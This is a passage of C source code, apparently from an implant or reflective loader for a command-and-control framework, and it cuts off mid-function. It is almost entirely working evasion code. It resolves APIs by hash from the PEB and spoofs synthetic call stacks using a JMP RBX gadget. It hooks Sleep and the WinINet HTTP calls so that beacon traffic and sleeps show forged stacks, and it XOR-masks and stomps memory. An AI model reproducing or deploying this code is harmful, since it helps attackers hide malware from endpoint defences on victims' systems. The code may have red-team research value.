    api->NtQueryVirtualMemory         = xGetProcAddress_hash( NTQUERYVIRTUALMEMORY         , &ntdll  );
    api->LoadLibraryExA               = xGetProcAddress_hash( LOADLIBRARYEXA               , &k32    );
    api->CreateFileMappingA           = xGetProcAddress_hash( CREATEFILEMAPPINGA           , &k32    );
    api->MapViewOfFile                = xGetProcAddress_hash( MAPVIEWOFFILE                , &k32    );
}

void getHeapApis(HEAP_APIS * api)
{
    Dll k32   = { 0 };
    Dll ntdll = { 0 };
    ntdll.dllBase = loaded_module_base_from_hash( NTDLL    );
    k32.dllBase   = loaded_module_base_from_hash( KERNEL32 );
    parse_module_headers( &ntdll );
    parse_module_headers( &k32   );

    api->GetProcessHeap = xGetProcAddress_hash( GETPROCESSHEAP,  &k32    );
    api->HeapFree       = xGetProcAddress_hash( HEAPFREE,        &k32    );
    api->HeapAlloc      = xGetProcAddress_hash( HEAPALLOC,       &k32    );
}

void * xLoadLibrary(void * library_name)
{
    // Check if the DLL is already loaded and the entry exists in the PEBLdr
    void* LibraryAddress = (void*)loaded_module_base_from_hash(hash_ascii_string(library_name));
    // If the DLL is not already loaded into process memory, use LoadLibraryA to load the imported module into memory
    if (LibraryAddress == NULL){
        APIS           api                   = { 0 };
        ANSI_STRING    ANSI_Library_Name     = { 0 };
        UNICODE_STRING UNICODE_Library_Name  = { 0 };
        Spoof_Struct   spoof_struct          = { 0 }; 

        setup_synthetic_callstack(&spoof_struct);

        getApis(&api);

        // Change ASCII string to ANSI struct string
        spoof_synthetic_callstack(
            &ANSI_Library_Name,            // Argument # 1
            library_name,                  // Argument # 2
            NULL,                          // Argument # 3
            NULL,                          // Argument # 4
            &spoof_struct,                 // Pointer to Spoof Struct 
            api.RtlInitAnsiString,         // Pointer to API Call
            (void *)0                      // Number of Arguments on Stack (Args 5+)
        ); 
        // api.RtlInitAnsiString(&ANSI_Library_Name,library_name);
        // RtlAnsiStringToUnicodeString converts the given ANSI source string into a Unicode string.
        // 3rd arg = True = routine should allocate the buffer space for the destination string. the caller must deallocate the buffer by calling RtlFreeUnicodeString.
        spoof_synthetic_callstack(
            &UNICODE_Library_Name,            // Argument # 1
            &ANSI_Library_Name,               // Argument # 2
            TRUE,                             // Argument # 3
            NULL,                             // Argument # 4
            &spoof_struct,                    // Pointer to Spoof Struct 
            api.RtlAnsiStringToUnicodeString, // Pointer to API Call
            (void *)0                         // Number of Arguments on Stack (Args 5+)
        ); 
        // api.RtlAnsiStringToUnicodeString( &UNICODE_Library_Name, &ANSI_Library_Name, TRUE );

        spoof_synthetic_callstack(
            NULL,                    // Argument # 1
            0,                       // Argument # 2
            &UNICODE_Library_Name,   // Argument # 3
            &LibraryAddress,         // Argument # 4
            &spoof_struct,           // Pointer to Spoof Struct 
            api.LdrLoadDll,          // Pointer to API Call
            (void *)0                // Number of Arguments on Stack (Args 5+)
        ); 
        // api.LdrLoadDll(NULL, 0,&UNICODE_Library_Name,&LibraryAddress);
        // cleanup
        spoof_synthetic_callstack(
            &UNICODE_Library_Name,    // Argument # 1
            NULL,                     // Argument # 2
            NULL,                     // Argument # 3
            NULL,                     // Argument # 4
            &spoof_struct,            // Pointer to Spoof Struct 
            api.RtlFreeUnicodeString, // Pointer to API Call
            (void *)0                 // Number of Arguments on Stack (Args 5+)
        ); 
        // api.RtlFreeUnicodeString( &UNICODE_Library_Name );
    }
    return LibraryAddress;
}

void * resolve_api_address_from_hash(DWORD api_hash, Dll * module)
{
    DWORD i = 0;
    DWORD* names;
    unsigned short* ordinals;
    DWORD* functions;
    BYTE* export_name;
 
    // Get function arrays
    names = (DWORD*)module->Export.NameTable;
    ordinals = (unsigned short*)module->Export.OrdinalTable;
    functions = (DWORD*)module->Export.AddressTable;

    // Loop over the names
    for (i = 0; i < module->Export.NumberOfNames; i++) {
        export_name = (BYTE*)(module->dllBase + names[i]);
        DWORD export_hash = hash_ascii_string(export_name);
        if (export_hash == api_hash)
        {
            return module->dllBase + functions[ordinals[i]];
        }
    }
    return 0;
}

void * xGetProcAddress_hash(DWORD api_hash, Dll * module) 
{
    Dll ntdll     = { 0 };
    ntdll.dllBase = loaded_module_base_from_hash( NTDLL );
    parse_module_headers(&ntdll);

    tNtQueryVirtualMemory NtQueryVirtualMemory = resolve_api_address_from_hash( NTQUERYVIRTUALMEMORY , &ntdll );

    void * api_address = resolve_api_address_from_hash( api_hash , module );

    MEMORY_INFORMATION_CLASS mic = { 0 };
    MEMORY_BASIC_INFORMATION mbi = { 0 };
    long status = NtQueryVirtualMemory(NtCurrentProcess(), (PVOID)api_address, mic, &mbi, sizeof(mbi), NULL);

    if (mbi.Protect != 0x10 && mbi.Protect != 0x20 && mbi.Protect != 0x40 && mbi.Protect != 0x80)
    {
        BYTE * api_forwarder_string = (BYTE *) api_address;
        BYTE * api_name = NULL;
        BYTE dll_forwarder_name[60] = {0};
        BYTE dot = '.';
        DWORD i = 0;
        DWORD j = 0;
        for (i = 0; api_forwarder_string[i] != '.'; i++); 
        api_name = api_forwarder_string + i + 1;
        for (j=0; j<=i; j++)
        {
            dll_forwarder_name[j] = (BYTE*)api_forwarder_string[j];
        }
        dll_forwarder_name[j+0] = 'd'; 
        dll_forwarder_name[j+1] = 'l'; 
        dll_forwarder_name[j+2] = 'l'; 

        void * module_base = xLoadLibrary(dll_forwarder_name);

        ANSI_STRING api_ansi = {0};
        Spoof_Struct spoof_struct = { 0 }; 
        setup_synthetic_callstack(&spoof_struct); 

        t_LdrGetProcedureAddress LdrGetProcedureAddress = resolve_api_address_from_hash( LDRGETPROCEDUREADDRESS , &ntdll );
        t_RtlInitAnsiString      RtlInitAnsiString      = resolve_api_address_from_hash( RTLINITANSISTRING      , &ntdll );

        spoof_synthetic_callstack(
            &api_ansi,             // Argument # 1
            api_name,              // Argument # 2
            NULL,                  // Argument # 3
            NULL,                  // Argument # 4
            &spoof_struct,         // Pointer to Spoof Struct 
            RtlInitAnsiString,     // Pointer to API Call
            (void *)0              // Number of Arguments on Stack (Args 5+)
        ); 
        // RtlInitAnsiString( &api_ansi, api_name );
        spoof_synthetic_callstack(
            module_base,           // Argument # 1
            &api_ansi,             // Argument # 2
            NULL,                  // Argument # 3
            &api_address,          // Argument # 4
            &spoof_struct,         // Pointer to Spoof Struct 
            LdrGetProcedureAddress,// Pointer to API Call
            (void *)0              // Number of Arguments on Stack (Args 5+)
        ); 
        // LdrGetProcedureAddress( module_base, &api_ansi, NULL, &api_address );
    }
    return api_address;
}

void utf16_to_utf8(wchar_t * wide_string, DWORD wide_string_len, BYTE * ascii_string) 
{
    for (DWORD i = 0; i < wide_string_len; ++i) 
    {
        wchar_t this_char = wide_string[i];
        * ascii_string++  = (BYTE)this_char;
    }
    * ascii_string = '\0'; 
}

DWORD wide_string_length(wchar_t * wide_string) 
{
    wchar_t * wide_string_position = wide_string;
    while (*wide_string_position != L'\0')
        ++wide_string_position;
    return wide_string_position - wide_string;
}

// Havoc C2 function
SIZE_T StringLengthA(LPCSTR String)
{
    LPCSTR String2;

    if ( String == NULL )
        return 0;

    for (String2 = String; *String2; ++String2);

    return (String2 - String);
}

BOOL StringCompareA( LPCSTR String1, LPCSTR String2 ) 
{
    for (; *String1 == *String2; String1++, String2++)
    {
        // if we hit the null byte terminator we are at the end of the string. They are equal
        if (*String1 == '\0')
            return TRUE;
    }
    return FALSE;
}

BOOL MemoryCompare(BYTE* memory_A, BYTE* memory_B, DWORD memory_size) 
{
    BYTE byte_A = 0x00;
    BYTE byte_B = 0x00;
    for (DWORD counter = 0; counter < memory_size; counter++)
    {
        byte_A = *(memory_A + counter);
        byte_B = *(memory_B + counter);
        if (byte_A != byte_B)
        {
            return FALSE;
        }
    }
    return TRUE;
}

void* FindGadget(BYTE* module_section_addr, DWORD module_section_size, BYTE* gadget, DWORD gadget_size)
{
    BYTE* this_module_byte_pointer = NULL;
    for (DWORD x = 0; x < module_section_size; x++)
    {
        this_module_byte_pointer = module_section_addr + x;
        if (MemoryCompare(this_module_byte_pointer, gadget, gadget_size))
        {
            return (void*)(this_module_byte_pointer);
        }
    };
    return NULL;
}

// From bottom of stack --> up
BYTE * find_api_return_address_on_stack(RUNTIME_FUNCTION* api_runtime_function, BYTE * api_virtual_address)
{
    NT_TIB* tib = (NT_TIB * ) __readgsqword(0x30);
    BYTE* api_end_virtual_address = api_virtual_address + api_runtime_function->EndAddress;
    ULONG_PTR* this_stack_address = tib->StackBase - 0x30;
    do
    {
        ULONG_PTR this_stack_value = *this_stack_address;
        if (this_stack_value)
        {
            if (
                (this_stack_value >= api_virtual_address)
                &&
                (this_stack_value < api_end_virtual_address)
                )
            {
                return (BYTE* )this_stack_address;
            }
        }
        this_stack_address -= 1;
    } while (true);
    return NULL;
}

// Havoc C2 function
SIZE_T CharStringToWCharString( PWCHAR Destination, PCHAR Source, SIZE_T MaximumAllowed )
{
    INT Length = (INT)MaximumAllowed;

    while (--Length >= 0)
    {
        if ( ! ( *Destination++ = *Source++ ) )
            return MaximumAllowed - Length - 1;
    }

    return MaximumAllowed - Length;
}

PVOID WINAPI RtlSecureZeroMemory(PVOID ptr,SIZE_T cnt){
  volatile BYTE *vptr = (volatile BYTE *)ptr;
  __stosb ((PBYTE)((DWORD64)vptr),0,cnt);
  return ptr;
}

void xorc(ULONG_PTR length, BYTE * buff, BYTE maskkey) {
  DWORD i;
  for (i = 0; i < length; ++i)
  {
    buff[i] ^= maskkey;
  }
}

void stomp(ULONG_PTR length, BYTE * buff) {
  DWORD i;
  for (i = 0; i < length; ++i)
  {
    buff[i] = 0;
  }
}

/* Credit to VulcanRaven project for the original implementation of these two*/
ULONG CalculateFunctionStackSize(PRUNTIME_FUNCTION pRuntimeFunction, const DWORD64 ImageBase)
{
    NTSTATUS status = STATUS_SUCCESS;
    PUNWIND_INFO pUnwindInfo = NULL;
    ULONG unwindOperation = 0;
    ULONG operationInfo = 0;
    ULONG index = 0;
    ULONG frameOffset = 0;
    StackFrame stackFrame = { 0 };

    // [1] Loop over unwind info.
    // NB As this is a PoC, it does not handle every unwind operation, but
    // rather the minimum set required to successfully mimic the default
    // call stacks included.
    pUnwindInfo = (PUNWIND_INFO)(pRuntimeFunction->UnwindData + ImageBase);
    while (index < pUnwindInfo->CountOfCodes)
    {
        unwindOperation = pUnwindInfo->UnwindCode[index].UnwindOp;
        operationInfo = pUnwindInfo->UnwindCode[index].OpInfo;
        // [2] Loop over unwind codes and calculate
        // total stack space used by target Function.
        if (unwindOperation == UWOP_PUSH_NONVOL) 
        {
            // UWOP_PUSH_NONVOL is 8 bytes.
            stackFrame.totalStackSize += 8;
            // Record if it pushes rbp as
            // this is important for UWOP_SET_FPREG.
            if (RBP_OP_INFO == operationInfo)
            {
                stackFrame.pushRbp = true;
                // Record when rbp is pushed to stack.
                stackFrame.countOfCodes = pUnwindInfo->CountOfCodes;
                stackFrame.pushRbpIndex = index + 1;
            }
        }
        if (unwindOperation == UWOP_SAVE_NONVOL) 
        {
            //UWOP_SAVE_NONVOL doesn't contribute to stack size
            // but you do need to increment index.
            index += 1;
        }
        if (unwindOperation == UWOP_ALLOC_SMALL) 
        {
            //Alloc size is op info field * 8 + 8.
            stackFrame.totalStackSize += ((operationInfo * 8) + 8);
        }
        if (unwindOperation == UWOP_ALLOC_LARGE) 
        {
            // Alloc large is either:
            // 1) If op info == 0 then size of alloc / 8
            // is in the next slot (i.e. index += 1).
            // 2) If op info == 1 then size is in next
            // two slots.
            index += 1;
            frameOffset = pUnwindInfo->UnwindCode[index].FrameOffset;
            if (operationInfo == 0)
            {
                frameOffset *= 8;
            }
            else
            {
                index += 1;
                frameOffset += (pUnwindInfo->UnwindCode[index].FrameOffset << 16);
            }
            stackFrame.totalStackSize += frameOffset;
        }
        if (unwindOperation == UWOP_SET_FPREG) 
        {
            // This sets rsp == rbp (mov rsp,rbp), so we need to ensure
            // that rbp is the expected value (in the frame above) when
            // it comes to spoof this frame in order to ensure the
            // call stack is correctly unwound.
            stackFrame.setsFramePointer = true;
            // printf("[-] Error: Unsupported Unwind Op Code\n");
        }
        index += 1;
    }

    // If chained unwind information is present then we need to
    // also recursively parse this and add to total stack size.
    if (0 != (pUnwindInfo->Flags & UNW_FLAG_CHAININFO))
    {
        index = pUnwindInfo->CountOfCodes;
        if (0 != (index & 1))
        {
            index += 1;
        }
        pRuntimeFunction = (PRUNTIME_FUNCTION)(&pUnwindInfo->UnwindCode[index]);
        return CalculateFunctionStackSize(pRuntimeFunction, ImageBase);
    }
    // Add the size of the return address (8 bytes).
    stackFrame.totalStackSize += 8;

    return stackFrame.totalStackSize;
Cleanup:
    return status;
}

BYTE * loaded_module_base_from_hash(DWORD hash)
{
    _PEB         * peb  = NULL;
    PEB_LDR_DATA * ldr  = NULL;

    peb = (_PEB*)__readgsqword(0x60);
    BYTE utf8_module_base_name[256] = {0};

    LDR_DATA_TABLE_ENTRY * first_module_entry = (LDR_DATA_TABLE_ENTRY *)peb->pLdr->InLoadOrderModuleList.Flink;
    LDR_DATA_TABLE_ENTRY * this_module_entry  = first_module_entry;
    do 
    {
        utf16_to_utf8( 
            this_module_entry->BaseDllName.Buffer,
            (this_module_entry->BaseDllName.Length * 2),
            utf8_module_base_name
        );

        if ( hash == hash_ascii_string(utf8_module_base_name) )
        {
            return this_module_entry->DllBase;
        }
        RtlSecureZeroMemory(utf8_module_base_name,sizeof(utf8_module_base_name));
        this_module_entry = (LDR_DATA_TABLE_ENTRY *) this_module_entry->InLoadOrderLinks.Flink;
    } while (this_module_entry != first_module_entry); // list loops back to the start
    return NULL; // Did not find DLL base address 
}

BYTE * get_modulebase_from_address(ULONG_PTR ReturnAddress)
{
    _PEB         * peb  = NULL;
    PEB_LDR_DATA * ldr  = NULL;

    peb = (_PEB*)__readgsqword(0x60);

    LDR_DATA_TABLE_ENTRY * first_module_entry = (LDR_DATA_TABLE_ENTRY *)peb->pLdr->InLoadOrderModuleList.Flink;
    LDR_DATA_TABLE_ENTRY * this_module_entry  = first_module_entry;
    do 
    {
        if ( 
            ( ReturnAddress > (ULONG_PTR) this_module_entry->DllBase ) 
            && 
            ( ReturnAddress < (ULONG_PTR) ( this_module_entry->DllBase + this_module_entry->SizeOfImage ) ) )
        {
            return this_module_entry->DllBase;
        }
        this_module_entry = (LDR_DATA_TABLE_ENTRY *) this_module_entry->InLoadOrderLinks.Flink;
    } while (this_module_entry != first_module_entry); // list loops back to the start
    return NULL; // Did not find DLL base address 
}

RUNTIME_FUNCTION* get_runtime_function_entry_for_api( Dll * module, BYTE* api_address)
{
    RUNTIME_FUNCTION* runtimeFunction             = NULL;
    RUNTIME_FUNCTION* this_runtime_function_entry = NULL;

    BYTE * api_offset_from_dll_base = api_address - (BYTE* )module->dllBase;

    this_runtime_function_entry = (RUNTIME_FUNCTION*)((BYTE*)module->pdata_section);

    for (DWORD i = 0; i < module->pdata_section_size / sizeof(RUNTIME_FUNCTION); i++) {
        if (
            (api_offset_from_dll_base >= this_runtime_function_entry->BeginAddress)
            &&
            (api_offset_from_dll_base  < this_runtime_function_entry->EndAddress)
            )
        {
            return this_runtime_function_entry;
            break;
        }
        this_runtime_function_entry = (RUNTIME_FUNCTION*)( (BYTE*)this_runtime_function_entry + sizeof(RUNTIME_FUNCTION));
    }
    return NULL;
}


ULONG CalculateFunctionStackSizeWrapper(BYTE * ReturnAddress, APIS * api)
{
    NTSTATUS status = STATUS_SUCCESS;
    PRUNTIME_FUNCTION pRuntimeFunction = NULL;
    DWORD64 ImageBase = 0;
    PUNWIND_HISTORY_TABLE pHistoryTable = NULL;
    // [0] Sanity check return address.
    if (!ReturnAddress)
    {
        status = STATUS_INVALID_PARAMETER;
        goto Cleanup;
    }
    // [1] Locate RUNTIME_FUNCTION for given Function.
    pRuntimeFunction = api->RtlLookupFunctionEntry((DWORD64)ReturnAddress, &ImageBase, pHistoryTable);
    if (NULL == pRuntimeFunction)
    {
        status = STATUS_ASSERTION_FAILURE;
        // printf("[!] STATUS_ASSERTION_FAILURE\n");
        goto Cleanup;
    }
    // [2] Recursively calculate the total stack size for
    // the Function we are "returning" to.
    return CalculateFunctionStackSize(pRuntimeFunction, ImageBase);
Cleanup:
    return status;
}

void setup_synthetic_callstack(Spoof_Struct * spoof_struct)
{
    APIS api  = {0};
    Dll ntdll = {0}; 
    Dll k32   = {0}; 
    BYTE * ReturnAddress       = NULL;
    BYTE * BaseThreadInitThunk = NULL;
    BYTE * RtlUserThreadStart  = NULL;
    t_NtQueryInformationThread NtQueryInformationThread = NULL;

    ntdll.dllBase = loaded_module_base_from_hash( NTDLL    );
    k32.dllBase   = loaded_module_base_from_hash( KERNEL32 );
    parse_module_headers( &ntdll );
    parse_module_headers(  &k32  );

    api.RtlLookupFunctionEntry            = (tRtlLookupFunctionEntry)    resolve_api_address_from_hash( RTLLOOKUPFUNCTIONENTRY   , &ntdll );
    BaseThreadInitThunk                   = (BYTE *)                     resolve_api_address_from_hash( BASETHREADINITTHUNK      , &k32   );
    RtlUserThreadStart                    = (BYTE *)                     resolve_api_address_from_hash( RTLUSERTHREADSTART       , &ntdll );
    NtQueryInformationThread              = (t_NtQueryInformationThread) resolve_api_address_from_hash( NTQUERYINFORMATIONTHREAD , &ntdll );

    // JMP RBX Gadget
    BYTE jmp_rbx_gadget[] = { 0xFF, 0x23 };
    spoof_struct->gadget_return_address    = FindGadget((LPBYTE)k32.text_section, k32.text_section_size, jmp_rbx_gadget, sizeof(jmp_rbx_gadget));
    spoof_struct->gadget_stack_frame_size  = CalculateFunctionStackSizeWrapper(spoof_struct->gadget_return_address, &api);

    // Stack Frame - BaseThreadInitThunk
    ReturnAddress = *(PVOID *)find_api_return_address_on_stack( get_runtime_function_entry_for_api( &k32 , BaseThreadInitThunk ), BaseThreadInitThunk);
    spoof_struct->frame_1_stack_frame_size = CalculateFunctionStackSizeWrapper(ReturnAddress, &api);
    spoof_struct->frame_1_return_address   = ReturnAddress;

    // Stack Frame - RtlUserThreadStart
    ReturnAddress = *(PVOID *)find_api_return_address_on_stack( get_runtime_function_entry_for_api( &ntdll , RtlUserThreadStart ), RtlUserThreadStart);
    spoof_struct->frame_0_stack_frame_size = CalculateFunctionStackSizeWrapper(ReturnAddress, &api);
    spoof_struct->frame_0_return_address   = ReturnAddress;
};

void Sleep_Hook(DWORD dwMilliseconds){
    Dll ntdll                 = { 0 }; 
    Spoof_Struct spoof_struct = { 0 };

    ntdll.dllBase = loaded_module_base_from_hash( NTDLL );
    parse_module_headers(&ntdll);

    tNtDelayExecution pNtDelayExecution = (tNtDelayExecution) resolve_api_address_from_hash( NTDELAYEXECUTION, &ntdll );

    setup_synthetic_callstack(&spoof_struct);

    LARGE_INTEGER    Time;
    PLARGE_INTEGER   TimePtr;
    TimePtr = &Time;
    TimePtr->QuadPart = dwMilliseconds * -10000LL;

    spoof_synthetic_callstack(
        (void *)(0),           // Argument # 1
        TimePtr,               // Argument # 2
        NULL,                  // Argument # 3
        NULL,                  // Argument # 4
        &spoof_struct,         // Pointer to Spoof Struct 
        pNtDelayExecution,     // Pointer to API Call
        (void *)0              // Number of Arguments on Stack (Args 5+)
    );
}

void resolve_wininet_apis(wininet_apis * wininet)
{
    Dll wnet = { 0 }; 
    RtlSecureZeroMemory( wininet, sizeof(wininet_apis) );
    wnet.dllBase = loaded_module_base_from_hash( WININET );
    parse_module_headers(&wnet);

    wininet->InternetOpenA               = (t_InternetOpenA)              resolve_api_address_from_hash( INTERNETOPENA,               &wnet );
    wininet->InternetConnectA            = (t_InternetConnectA)           resolve_api_address_from_hash( INTERNETCONNECTA,            &wnet );
    wininet->HttpOpenRequestA            = (t_HttpOpenRequestA)           resolve_api_address_from_hash( HTTPOPENREQUESTA,            &wnet );
    wininet->HttpSendRequestA            = (t_HttpSendRequestA)           resolve_api_address_from_hash( HTTPSENDREQUESTA,            &wnet );
    wininet->InternetReadFile            = (t_InternetReadFile)           resolve_api_address_from_hash( INTERNETREADFILE,            &wnet );
    wininet->InternetQueryDataAvailable  = (t_InternetQueryDataAvailable) resolve_api_address_from_hash( INTERNETQUERYDATAAVAILABLE,  &wnet );
    wininet->InternetCloseHandle         = (t_InternetCloseHandle)        resolve_api_address_from_hash( INTERNETCLOSEHANDLE,         &wnet );
    wininet->InternetQueryOptionA        = (t_InternetQueryOptionA)       resolve_api_address_from_hash( INTERNETQUERYOPTIONA,        &wnet );
    wininet->InternetSetOptionA          = (t_InternetSetOptionA)         resolve_api_address_from_hash( INTERNETSETOPTIONA,          &wnet );
    wininet->InternetSetStatusCallback   = (t_InternetSetStatusCallback)  resolve_api_address_from_hash( INTERNETSETSTATUSCALLBACK,   &wnet );
    wininet->HttpAddRequestHeadersA      = (t_HttpAddRequestHeadersA)     resolve_api_address_from_hash( HTTPADDREQUESTHEADERSA,      &wnet );
    wininet->HttpQueryInfoA              = (t_HttpQueryInfoA)             resolve_api_address_from_hash( HTTPQUERYINFOA,              &wnet );

}

LPVOID InternetOpenA_Hook(BYTE* lpszAgent, DWORD dwAccessType, BYTE* lpszProxy, BYTE* lpszProxyBypass, DWORD  dwFlags) 
{
    Spoof_Struct spoof_struct = { 0 }; 
    wininet_apis wininet      = { 0 };
    resolve_wininet_apis(&wininet);
    setup_synthetic_callstack(&spoof_struct);
    return spoof_synthetic_callstack(
        lpszAgent,               // Argument # 1
        dwAccessType,            // Argument # 2
        lpszProxy,               // Argument # 3
        lpszProxyBypass,         // Argument # 4
        &spoof_struct,           // Pointer to Spoof Struct 
        wininet.InternetOpenA,   // Pointer to API Call
        (void *)1,               // Number of Arguments on Stack (Args 5+)
        dwFlags
    ); 
    // return wininet.InternetOpenA( lpszAgent,  dwAccessType, lpszProxy, lpszProxyBypass,  dwFlags) ;
}

LPVOID InternetConnectA_Hook(void* hInternet, LPCSTR lpszServerName, WORD nServerPort, LPCSTR lpszUserName, LPCSTR lpszPassword, DWORD dwService, DWORD dwFlags, DWORD_PTR dwContext) 
{
    Spoof_Struct spoof_struct = { 0 };
    wininet_apis wininet      = { 0 };
    resolve_wininet_apis(&wininet);
    setup_synthetic_callstack(&spoof_struct);

    return spoof_synthetic_callstack(
        hInternet,                   // Argument # 1
        lpszServerName,              // Argument # 2
        nServerPort,                 // Argument # 3
        lpszUserName,                // Argument # 4
        &spoof_struct,               // Pointer to Spoof Struct 
        wininet.InternetConnectA,    // Pointer to API Call
        (void *)4,                   // Number of Arguments on Stack (Args 5+)
        lpszPassword,
        dwService,
        dwFlags,
        dwContext 
    ); 
    // return     wininet.InternetConnectA( hInternet, lpszServerName, nServerPort, lpszUserName,  lpszPassword, dwService, dwFlags,  dwContext) ;
}

LPVOID HttpOpenRequestA_Hook(void* hConnect, LPCSTR lpszVerb, LPCSTR lpszObjectName, LPCSTR lpszVersion, LPCSTR lpszReferrer, LPCSTR * lplpszAcceptTypes, DWORD dwFlags, DWORD_PTR dwContext) 
{
    Spoof_Struct spoof_struct = { 0 }; 
    wininet_apis wininet      = { 0 };
    resolve_wininet_apis(&wininet);
    setup_synthetic_callstack(&spoof_struct);
    return spoof_synthetic_callstack(
        hConnect,                   // Argument # 1
        lpszVerb,                   // Argument # 2
        lpszObjectName,             // Argument # 3
        lpszVersion,                // Argument # 4
        &spoof_struct,              // Pointer to Spoof Struct 
        wininet.HttpOpenRequestA,   // Pointer to API Call
        (void *)4,                  // Number of Arguments on Stack (Args 5+)
        lpszReferrer,
        lplpszAcceptTypes,
        dwFlags,
        dwContext 
    ); 
    // return wininet.HttpOpenRequestA( hConnect, lpszVerb, lpszObjectName,  lpszVersion,  lpszReferrer, lplpszAcceptTypes, dwFlags, dwContext) ;
}

BOOL HttpSendRequestA_Hook(void* hRequest, LPCSTR lpszHeaders, DWORD dwHeadersLength, LPVOID lpOptional, DWORD dwOptionalLength) 
{
    Spoof_Struct spoof_struct = { 0 }; 
    wininet_apis wininet      = { 0 };
    resolve_wininet_apis(&wininet);
    setup_synthetic_callstack(&spoof_struct);
    return spoof_synthetic_callstack(
        hRequest,                   // Argument # 1
        lpszHeaders,                // Argument # 2
        dwHeadersLength,            // Argument # 3
        lpOptional,                 // Argument # 4
        &spoof_struct,              // Pointer to Spoof Struct 
        wininet.HttpSendRequestA,   // Pointer to API Call
        (void *)1,                  // Number of Arguments on Stack (Args 5+)
        dwOptionalLength
    ); 
    // return wininet.HttpSendRequestA(  hRequest,  lpszHeaders,  dwHeadersLength,  lpOptional,  dwOptionalLength) ;
}

BOOL InternetReadFile_Hook(void* hFile, LPVOID lpBuffer, DWORD dwNumberOfBytesToRead, LPDWORD lpdwNumberOfBytesRead) 
{
    Spoof_Struct spoof_struct = { 0 }; 
    wininet_apis wininet      = { 0 };
    resolve_wininet_apis(&wininet);
    setup_synthetic_callstack(&spoof_struct);
    return spoof_synthetic_callstack(
        hFile,                         // Argument # 1
        lpBuffer,                      // Argument # 2
        dwNumberOfBytesToRead,         // Argument # 3
        lpdwNumberOfBytesRead,         // Argument # 4
        &spoof_struct,                 // Pointer to Spoof Struct 
        wininet.InternetReadFile,      // Pointer to API Call
        (void *)0                      // Number of Arguments on Stack (Args 5+)
    ); 
    // return wininet.InternetReadFile(  hFile,  lpBuffer,  dwNumberOfBytesToRead, lpdwNumberOfBytesRead) ;
}

BOOL InternetQueryDataAvailable_Hook(void* hFile, LPDWORD lpdwNumberOfBytesAvailable, DWORD dwFlags, DWORD_PTR dwContext) 
{
    Spoof_Struct spoof_struct = { 0 }; 
    wininet_apis wininet      = { 0 };
    resolve_wininet_apis(&wininet);
    setup_synthetic_callstack(&spoof_struct);
    return spoof_synthetic_callstack(
        hFile,                               // Argument # 1
        lpdwNumberOfBytesAvailable,          // Argument # 2
        dwFlags,                             // Argument # 3
        dwContext,                           // Argument # 4
        &spoof_struct,                       // Pointer to Spoof Struct 
        wininet.InternetQueryDataAvailable,  // Pointer to API Call
        (void *)0                            // Number of Arguments on Stack (Args 5+)
    ); 
    // return wininet.InternetQueryDataAvailable(  hFile,  lpdwNumberOfBytesAvailable, dwFlags,  dwContext) ;
}

BOOL InternetCloseHandle_Hook(HINTERNET hInternet) 
{
    Spoof_Struct spoof_struct = { 0 }; 
    wininet_apis wininet      = { 0 };
    resolve_wininet_apis(&wininet);
    setup_synthetic_callstack(&spoof_struct);
    return spoof_synthetic_callstack(
        hInternet,                    // Argument # 1
        NULL,                         // Argument # 2
        NULL,                         // Argument # 3
        NULL,                         // Argument # 4
        &spoof_struct,                // Pointer to Spoof Struct 
        wininet.InternetCloseHandle,  // Pointer to API Call
        (void *)0                     // Number of Arguments on Stack (Args 5+)
    ); 
    // return wininet.InternetCloseHandle(  hInternet) ;
}

BOOL InternetQueryOptionA_Hook(HINTERNET hInternet, DWORD dwOption, LPVOID lpBuffer, LPDWORD lpdwBufferLength) 
{
    Spoof_Struct spoof_struct = { 0 }; 
    wininet_apis wininet      = { 0 };
    resolve_wininet_apis(&wininet);
    setup_synthetic_callstack(&spoof_struct);
    return spoof_synthetic_callstack(
        hInternet,                     // Argument # 1
        dwOption,                      // Argument # 2
        lpBuffer,                      // Argument # 3
        lpdwBufferLength,              // Argument # 4
        &spoof_struct,                 // Pointer to Spoof Struct 
        wininet.InternetQueryOptionA,  // Pointer to API Call
        (void *)0                      // Number of Arguments on Stack (Args 5+)
    ); 
    // return wininet.InternetQueryOptionA(  hInternet,  dwOption,  lpBuffer,  lpdwBufferLength) ;
}

BOOL InternetSetOptionA_Hook(HINTERNET hInternet, DWORD dwOption, LPVOID lpBuffer, DWORD dwBufferLength) 
{
    Spoof_Struct spoof_struct = { 0 }; 
    wininet_apis wininet      = { 0 };
    resolve_wininet_apis(&wininet);
    setup_synthetic_callstack(&spoof_struct);
    return spoof_synthetic_callstack(
        hInternet,                    // Argument # 1
        dwOption,                     // Argument # 2
        lpBuffer,                     // Argument # 3
        dwBufferLength,               // Argument # 4
        &spoof_struct,                // Pointer to Spoof Struct 
        wininet.InternetSetOptionA,   // Pointer to API Call
        (void *)0                     // Number of Arguments on Stack (Args 5+)
    ); 
    // return wininet.InternetSetOptionA(hInternet, dwOption, lpBuffer,  dwBufferLength) ;
}

BOOL InternetSetStatusCallback_Hook(HINTERNET hInternet, void* lpfnInternetCallback) 
{
    Spoof_Struct spoof_struct = { 0 }; 
    wininet_apis wininet      = { 0 };
    resolve_wininet_apis(&wininet);
    setup_synthetic_callstack(&spoof_struct);
    return spoof_synthetic_callstack(
        hInternet,                         // Argument # 1
        lpfnInternetCallback,              // Argument # 2
        NULL,                              // Argument # 3
        NULL,                              // Argument # 4
        &spoof_struct,                     // Pointer to Spoof Struct 
        wininet.InternetSetStatusCallback, // Pointer to API Call
        (void *)0                          // Number of Arguments on Stack (Args 5+)
    ); 
    // return wininet.InternetSetStatusCallback( hInternet,  lpfnInternetCallback) ;
}

BOOL HttpAddRequestHeadersA_Hook(HINTERNET hRequest, LPCWSTR lpszHeaders, DWORD dwHeadersLength, DWORD dwModifiers) 
{
    Spoof_Struct spoof_struct = { 0 }; 
    wininet_apis wininet      = { 0 };
    resolve_wininet_apis(&wininet);
    setup_synthetic_callstack(&spoof_struct);
    return spoof_synthetic_callstack(
        hRequest,                        // Argument # 1
        lpszHeaders,                     // Argument # 2
        dwHeadersLength,                 // Argument # 3
        dwModifiers,                     // Argument # 4
        &spoof_struct,                   // Pointer to Spoof Struct 
        wininet.HttpAddRequestHeadersA,  // Pointer to API Call
        (void *)0                        // Number of Arguments on Stack (Args 5+)
    ); 
    // return wininet.HttpAddRequestHeadersA(  hRequest,  lpszHeaders, dwHeadersLength,  dwModifiers) ;
}

BOOL HttpQueryInfoA_Hook(HINTERNET hRequest, DWORD dwInfoLevel, LPVOID lpBuffer, LPDWORD lpdwBufferLength, LPDWORD lpdwIndex) 
{
    Spoof_Struct spoof_struct = { 0 }; 
